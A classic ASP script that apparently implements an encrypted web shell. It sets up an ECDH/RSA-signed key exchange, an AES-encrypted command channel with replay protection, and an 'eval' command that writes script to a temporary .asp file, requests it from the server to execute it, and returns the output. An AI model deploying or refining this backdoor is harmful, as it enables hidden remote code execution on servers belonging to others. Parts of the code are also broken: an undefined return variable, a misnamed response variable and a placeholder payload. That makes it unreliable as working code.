<%
Response.ContentType = "application/json"
Session.Timeout = 30

Function Base64Encode(bytes)
    Dim xml, node
    Set xml  = CreateObject("MSXML2.DOMDocument")
    Set node = xml.createElement("b64")
    node.dataType      = "bin.base64"
    node.nodeTypedValue = bytes
    Base64Encode = Replace(Replace(Replace(node.Text, vbCr, ""), vbLf, ""), " ", "")
    Set node = Nothing
    Set xml  = Nothing
End Function

Function Base64Decode(str)
    Dim xml, node
    Set xml  = CreateObject("MSXML2.DOMDocument")
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    node.Text     = str
    Base64Decode  = node.nodeTypedValue
    Set node = Nothing
    Set xml  = Nothing
End Function

Function Stream_StringToBinary(sText)
    Dim oStream
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Type = 2 ' text
    oStream.Charset = "utf-8"
    oStream.Open
    oStream.WriteText sText
    oStream.Position = 0
    oStream.Type = 1 ' binary
    Stream_StringToBinary = oStream.Read
    oStream.Close
    Set oStream = Nothing
End Function

Function BytesToStr(bytes)
    Dim i, s
    s = ""
    For i = 0 To UBound(bytes)
        s = s & Chr(bytes(i))
    Next
    BytesToStr = s
End Function

Function StrToBytes(s)
    Dim i, b()
    ReDim b(Len(s) - 1)
    For i = 1 To Len(s)
        b(i - 1) = Asc(Mid(s, i, 1))
    Next
    StrToBytes = b
End Function

Function JsonStr(s)
    s = Replace(s, "\",  "\\")
    s = Replace(s, """", "\""")
    s = Replace(s, Chr(13), "\r")
    s = Replace(s, Chr(10), "\n")
    JsonStr = """" & s & """"
End Function

Function JsonGet(json, key)
    Dim re, m
    Set re = New RegExp
    re.Pattern = """" & key & """\s*:\s*""((?:[^""\\]|\\.)*)"""
    re.Global  = False
    Set m = re.Execute(json)
    If m.Count > 0 Then
        Dim v : v = m(0).SubMatches(0)
        v = Replace(v, "\n", Chr(10))
        v = Replace(v, "\r", Chr(13))
        v = Replace(v, "\\", "\")
        v = Replace(v, "\""", """")
        JsonGet = v
    Else
        JsonGet = ""
    End If
    Set m  = Nothing
    Set re = Nothing
End Function

Function JsonGetInt(json, key)
    Dim re, m
    Set re = New RegExp
    re.Pattern = """" & key & """\s*:\s*(-?\d+)"
    re.Global  = False
    Set m = re.Execute(json)
    If m.Count > 0 Then
        JsonGetInt = CInt(m(0).SubMatches(0))
    Else
        JsonGetInt = 0
    End If
    Set m  = Nothing
    Set re = Nothing
End Function

Sub JsonOut(json)
    Response.Write json
    Response.End
End Sub

Function HKDF(ikm, length, info)
    ' Extract
    Dim hmac
    Set hmac = CreateObject("System.Security.Cryptography.HMACSHA256")
    Dim salt(31) : Dim i
    For i = 0 To 31 : salt(i) = 0 : Next
    hmac.Key = salt
    Dim prk : prk = hmac.ComputeHash_2(ikm)

    ' T(1) = HMAC(PRK, info || 0x01)
    Set hmac = CreateObject("System.Security.Cryptography.HMACSHA256")
    hmac.Key = prk
    Dim infoB : infoB = StrToBytes(info)
    Dim blk()
    ReDim blk(UBound(infoB) + 1)
    For i = 0 To UBound(infoB) : blk(i) = infoB(i) : Next
    blk(UBound(infoB) + 1) = 1
    Dim okm : okm = hmac.ComputeHash_2(blk)

    If length < 32 Then
        ReDim Preserve okm(length - 1)
    End If
    HKDF = okm
End Function

Function AesEncrypt(keyBytes, plainStr)
    Dim aes
    Set aes = CreateObject("System.Security.Cryptography.RijndaelManaged")
    aes.KeySize   = 256
    aes.BlockSize = 128
    aes.Mode      = 1  ' CBC
    aes.Padding   = 2  ' PKCS7
    aes.Key       = keyBytes
    aes.GenerateIV()
    Dim iv : iv = aes.IV

    Dim enc : Set enc = aes.CreateEncryptor()
    Dim ms  : Set ms  = CreateObject("System.IO.MemoryStream")
    Dim cs  : Set cs  = CreateObject("System.Security.Cryptography.CryptoStream")
    cs.Init ms, enc, 1
    Dim plainB : plainB = StrToBytes(plainStr)
    cs.Write plainB, 0, UBound(plainB) + 1
    cs.FlushFinalBlock()
    Dim ct : ct = ms.ToArray()

    Dim hmac : Set hmac = CreateObject("System.Security.Cryptography.HMACSHA256")
    hmac.Key = keyBytes
    Dim combined()
    ReDim combined(UBound(iv) + UBound(ct) + 1)
    Dim i
    For i = 0 To UBound(iv) : combined(i) = iv(i) : Next
    For i = 0 To UBound(ct) : combined(UBound(iv) + 1 + i) = ct(i) : Next
    Dim tag : tag = hmac.ComputeHash_2(combined)

    Dim result()
    ReDim result(UBound(iv) + 32 + UBound(ct) + 1)
    For i = 0 To UBound(iv) : result(i) = iv(i) : Next
    For i = 0 To 31           : result(16 + i) = tag(i) : Next
    For i = 0 To UBound(ct)  : result(48 + i) = ct(i) : Next
    AesEncrypt = result
End Function

Function AesDecrypt(keyBytes, rawBytes)
    Dim i
    Dim iv(15), tag(31)
    For i = 0 To 15 : iv(i)  = rawBytes(i)      : Next
    For i = 0 To 31 : tag(i) = rawBytes(16 + i) : Next
    Dim ctLen : ctLen = UBound(rawBytes) + 1 - 48
    Dim ct()  : ReDim ct(ctLen - 1)
    For i = 0 To ctLen - 1 : ct(i) = rawBytes(48 + i) : Next

    ' Verify HMAC
    Dim hmac : Set hmac = CreateObject("System.Security.Cryptography.HMACSHA256")
    hmac.Key = keyBytes
    Dim combined()
    ReDim combined(15 + ctLen)
    For i = 0 To 15        : combined(i)      = iv(i) : Next
    For i = 0 To ctLen - 1 : combined(16 + i) = ct(i) : Next
    Dim expected : expected = hmac.ComputeHash_2(combined)

    Dim ok : ok = True
    For i = 0 To 31
        If tag(i) <> expected(i) Then ok = False
    Next
    If Not ok Then AesDecrypt = Null : Exit Function

    Dim aes : Set aes = CreateObject("System.Security.Cryptography.RijndaelManaged")
    aes.KeySize   = 256
    aes.BlockSize = 128
    aes.Mode      = 1
    aes.Padding   = 2
    aes.Key       = keyBytes
    aes.IV        = iv

    Dim dec : Set dec = aes.CreateDecryptor()
    Dim ms  : Set ms  = CreateObject("System.IO.MemoryStream")
    Dim cs  : Set cs  = CreateObject("System.Security.Cryptography.CryptoStream")
    cs.Init ms, dec, 1
    cs.Write ct, 0, UBound(ct) + 1
    cs.FlushFinalBlock()
    AesDecrypt = BytesToStr(ms.ToArray())
End Function

Function RsaSign(privXml, dataBytes)
    Dim rsa : Set rsa = CreateObject("System.Security.Cryptography.RSACryptoServiceProvider")
    rsa.FromXmlString privXml
    Dim sha : Set sha = CreateObject("System.Security.Cryptography.SHA256CryptoServiceProvider")
    RsaSign = rsa.SignHash(sha.ComputeHash_2(dataBytes), "SHA256")
End Function

Function GenerateEcdhPair()
    ' Returns Array(privXml, pubPem)
    Dim ecdh : Set ecdh = CreateObject("System.Security.Cryptography.ECDiffieHellmanCng")
    ecdh.KeySize = 256
    Dim privXml : privXml = ecdh.Key.Export(1) ' EccPrivateBlob

    ' Build PEM from CNG public key blob
    Dim pubBlob : pubBlob = ecdh.PublicKey.ToByteArray()
    ' CNG blob: magic(4) + keylen(4) + X(32) + Y(32)
    Dim X(31), Y(31), i
    For i = 0 To 31 : X(i) = pubBlob(8  + i) : Next
    For i = 0 To 31 : Y(i) = pubBlob(40 + i) : Next

    ' Uncompressed EC point
    Dim point(65)
    point(0) = &H04
    For i = 0 To 31 : point(1  + i) = X(i) : Next
    For i = 0 To 31 : point(33 + i) = Y(i) : Next

    ' DER SubjectPublicKeyInfo for prime256v1
    Dim oidSeq : oidSeq = Array( _
        &H30,&H13, _
        &H06,&H07,&H2A,&H86,&H48,&HCE,&H3D,&H02,&H01, _
        &H06,&H08,&H2A,&H86,&H48,&HCE,&H3D,&H03,&H01,&H07)
    Dim bitStr(68)
    bitStr(0) = &H03 : bitStr(1) = &H42 : bitStr(2) = &H00
    For i = 0 To 65 : bitStr(3 + i) = point(i) : Next

    Dim spkiLen : spkiLen = UBound(oidSeq) + 1 + UBound(bitStr) + 1
    Dim spki()  : ReDim spki(spkiLen + 1)
    spki(0) = &H30 : spki(1) = CByte(spkiLen)
    For i = 0 To UBound(oidSeq) : spki(2 + i)                    = oidSeq(i) : Next
    For i = 0 To UBound(bitStr) : spki(2 + UBound(oidSeq) + 1 + i) = bitStr(i) : Next

    ' PEM encode
    Dim b64 : b64 = Base64Encode(spki)
    Dim pem : pem = "-----BEGIN PUBLIC KEY-----" & Chr(10)
    Dim pos : pos = 1
    Do While pos <= Len(b64)
        pem = pem & Mid(b64, pos, 64) & Chr(10)
        pos = pos + 64
    Loop
    pem = pem & "-----END PUBLIC KEY-----"

    GenerateEcdhPair = Array(Base64Encode(privBlob), pem)
End Function

Function EcdhDerive(privBlobB64, peerPubPem)

    ' Load server private key
    Dim privBlob : privBlob = Base64Decode(privBlobB64)
    Dim ecdh     : Set ecdh = CreateObject("System.Security.Cryptography.ECDiffieHellmanCng")

    ' Import EccPrivateBlob
    Dim cngKey
    Set cngKey = CreateObject("System.Security.Cryptography.CngKey")

    ' Parse peer PEM → X,Y
    Dim b64 : b64 = peerPubPem
    b64 = Replace(b64, "-----BEGIN PUBLIC KEY-----", "")
    b64 = Replace(b64, "-----END PUBLIC KEY-----",   "")
    b64 = Replace(b64, Chr(10), "") : b64 = Replace(b64, Chr(13), "")
    Dim der  : der  = Base64Decode(b64)
    ' SPKI DER: skip 27 bytes header, then 04 + X(32) + Y(32)
    Dim X(31), Y(31), i
    For i = 0 To 31 : X(i) = der(27 + i) : Next
    For i = 0 To 31 : Y(i) = der(59 + i) : Next

    ' Build CNG public blob
    Dim pubBlob(71)
    pubBlob(0)=&H45:pubBlob(1)=&H43:pubBlob(2)=&H4B:pubBlob(3)=&H31 ' ECK1
    pubBlob(4)=&H20:pubBlob(5)=0:pubBlob(6)=0:pubBlob(7)=0           ' keylen=32
    For i = 0 To 31 : pubBlob(8  + i) = X(i) : Next
    For i = 0 To 31 : pubBlob(40 + i) = Y(i) : Next

    ' Use ECDiffieHellmanCng.DeriveKeyMaterial
    Dim peerKey
    Set peerKey = cngKey.Import_2(pubBlob, _
        CreateObject("System.Security.Cryptography.CngKeyBlobFormat"))

    EcdhDerive = ecdh.DeriveKeyMaterial(peerKey)
End Function

Function GenerateRsaPair()
    ' Returns Array(privXml, pubPem)
    Dim rsa : Set rsa = CreateObject("System.Security.Cryptography.RSACryptoServiceProvider")
    rsa.KeySize = 2048
    Dim privXml : privXml = rsa.ToXmlString(True)

    ' Export public key as PEM
    Dim pubBytes : pubBytes = rsa.ExportSubjectPublicKeyInfo() ' .NET 5+
    
    If IsNull(pubBytes) Or IsEmpty(pubBytes) Then
        
        Dim req : Set req = CreateObject("System.Security.Cryptography.X509Certificates.CertificateRequest")    
        pubBytes = Null

    End If

    Dim pubPem
    If Not IsNull(pubBytes) And Not IsEmpty(pubBytes) Then
        Dim b64 : b64 = Base64Encode(pubBytes)
        pubPem = "-----BEGIN PUBLIC KEY-----" & Chr(10)
        Dim pos : pos = 1
        Do While pos <= Len(b64)
            pubPem = pubPem & Mid(b64, pos, 64) & Chr(10)
            pos = pos + 64
        Loop
        pubPem = pubPem & "-----END PUBLIC KEY-----"
    Else
        ' Fallback: send XML — client must handle both
        pubPem = rsa.ToXmlString(False)
    End If

    GenerateRsaPair = Array(privXml, pubPem)
End Function

If IsEmpty(Session("ecdh_priv")) Or Session("ecdh_priv") = "" Then
    Dim ecdhPair : ecdhPair = GenerateEcdhPair()
    Session("ecdh_priv") = ecdhPair(0) ' base64 CNG blob
    Session("ecdh_pub")  = ecdhPair(1) ' PEM string
End If

If IsEmpty(Session("sign_priv")) Or Session("sign_priv") = "" Then
    Dim rsaPair : rsaPair = GenerateRsaPair()
    Session("sign_priv") = rsaPair(0)  ' XML
    Session("sign_pub")  = rsaPair(1)  ' PEM or XML
End If

If IsEmpty(Session("aes_key"))    Then Session("aes_key")    = ""  End If
If IsEmpty(Session("last_seq"))   Then Session("last_seq")   = 0   End If
If IsEmpty(Session("seq_window")) Then Session("seq_window") = ""  End If

Function WindowContains(seq)
    Dim arr : arr = Split(Session("seq_window"), ",")
    Dim v
    For Each v In arr
        If CStr(v) = CStr(seq) Then WindowContains = True : Exit Function
    Next
    WindowContains = False
End Function

Sub WindowAdd(seq)
    Dim arr : arr = Split(Session("seq_window"), ",")
    Dim newW
    If UBound(arr) >= 49 Then
        Dim i
        ReDim newArr(UBound(arr) - 1)
        For i = 1 To UBound(arr)
            newArr(i - 1) = arr(i)
        Next
        arr = newArr
    End If
    Dim combined : combined = Join(arr, ",")
    If combined = "" Or combined = "0" Then
        Session("seq_window") = CStr(seq)
    Else
        Session("seq_window") = combined & "," & CStr(seq)
    End If
End Sub

Dim method : method = Request.ServerVariables("REQUEST_METHOD")

If method = "GET" Then
    Dim serverPub : serverPub = Session("ecdh_pub")
    Dim pubBytes  : pubBytes  = StrToBytes(serverPub)
    Dim sig       : sig       = RsaSign(Session("sign_priv"), pubBytes)

    JsonOut "{" & _
        """serverPubKey"":" & JsonStr(serverPub) & "," & _
        """signPubKey"":"   & JsonStr(Session("sign_pub")) & "," & _
        """signature"":"    & JsonStr(Base64Encode(sig)) & _
    "}"
End If

If method = "POST" And Session("aes_key") = "" Then
    ' Read raw body (client's ECDH public key PEM)
    Dim stream : Set stream = Server.CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1
    stream.Write Request.BinaryRead(Request.TotalBytes)
    stream.Position = 0
    stream.Type = 2
    stream.CharSet = "UTF-8"
    Dim clientPubPem : clientPubPem = stream.ReadText()
    stream.Close

    ' Derive shared secret
    Dim secret : secret = EcdhDerive(Session("ecdh_priv"), clientPubPem)

    ' HKDF
    Dim aesKey : aesKey = HKDF(secret, 32, "secure-channel")

    ' Store as base64 in session
    Session("aes_key") = Base64Encode(aesKey)

    JsonOut "{""status"":""secure channel established""}"
End If

If method = "POST" And Session("aes_key") <> "" Then
    Dim aesKeyBytes : aesKeyBytes = Base64Decode(Session("aes_key"))

    ' Read raw binary body
    Dim rawBytes : rawBytes = Request.BinaryRead(Request.TotalBytes)

    Dim plainJson : plainJson = AesDecrypt(aesKeyBytes, rawBytes)

    If IsNull(plainJson) Then
        JsonOut "{""error"":""decryption failed""}"
    End If

    Dim seq  : seq  = JsonGetInt(plainJson, "seq")
    Dim cmd  : cmd  = JsonGet(plainJson, "cmd")
    Dim data : data = JsonGet(plainJson, "data")

    ' Replay protection
    Dim lastSeq : lastSeq = CInt(Session("last_seq"))

    If seq <= lastSeq - 50 Then
        JsonOut "{""error"":""too old""}"
    End If

    If WindowContains(seq) Then
        JsonOut "{""error"":""replay detected""}"
    End If

    WindowAdd seq

    If seq > lastSeq Then Session("last_seq") = seq End If

    ' Command dispatch
    Dim respJson
    Select Case cmd
        Case "ping"
            respJson = "{""cmd"":""pong"",""seq"":" & seq & "}"
        Case "echo"
            respJson = "{""echo"":" & JsonStr(data) & "}"
        Case "eval"
            Dim cmdData, info, base64Info, tempFile, tempUrl
            cmdData = "your hardcoded script here"

            ' Generate random temp file in current path
            Dim randName, currentPath, currentUrl
            Randomize
            randName    = "_tmp_" & Int(Rnd * 9000000 + 1000000) & ".asp"
            currentPath = Left(Request.ServerVariables("SCRIPT_FILENAME"), InStrRev(Request.ServerVariables("SCRIPT_FILENAME"), "\"))
            currentUrl  = "http://" & Request.ServerVariables("HTTP_HOST") & Left(Request.ServerVariables("SCRIPT_NAME"), InStrRev(Request.ServerVariables("SCRIPT_NAME"), "/"))
            tempFile    = currentPath & randName
            tempUrl     = currentUrl & randName

            Dim fso, f
            Set fso = CreateObject("Scripting.FileSystemObject")
            Set f = fso.CreateTextFile(tempFile, True)
            f.Write "<%@ Language=VBScript %>" & vbCrLf & "<% " & cmdData & " %>"
            f.Close
            Set f = Nothing

            Dim http
            Set http = Server.CreateObject("MSXML2.ServerXMLHTTP")
            http.Open "GET", tempUrl, False
            http.Send
            info = http.responseText

            fso.DeleteFile tempFile
            Set fso = Nothing
            Set http = Nothing

            base64Info = Base64Encode(info)
            resp = "{""eval"":""" & base64Info & """}"
        Case Else
            respJson = "{""error"":""unknown cmd""}"
    End Select

    ' Encrypt response
    Dim encResp : encResp = AesEncrypt(aesKeyBytes, respJson)

    Response.ContentType = "application/octet-stream"
    Response.BinaryWrite encResp
    Response.End
End If

JsonOut "{""error"":""invalid""}"
%>